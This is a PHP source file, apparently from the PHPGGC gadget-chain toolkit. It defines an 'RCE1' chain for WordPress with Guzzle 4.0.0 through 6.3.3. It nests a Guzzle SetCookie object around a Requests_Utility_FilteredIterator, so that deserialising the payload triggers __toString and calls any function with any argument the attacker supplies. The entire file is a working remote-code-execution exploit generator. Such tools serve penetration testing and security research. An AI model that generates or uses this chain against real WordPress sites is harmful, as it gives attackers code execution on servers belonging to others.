<?php

namespace GadgetChain\WordPress\Guzzle;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '4.0.0 <= 6.3.3+';
    public static $vector = '__toString';
    public static $author = 'erwan_lr';
    public static $informations = 'Tested up to WP 5.2 and Guzzle 6.3.3. Newest versions might also work.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \GuzzleHttp\Cookie\SetCookie(
            new \Requests_Utility_FilteredIterator(['Name' => $parameter, 'Value' => ''], $function)
        );
    }
}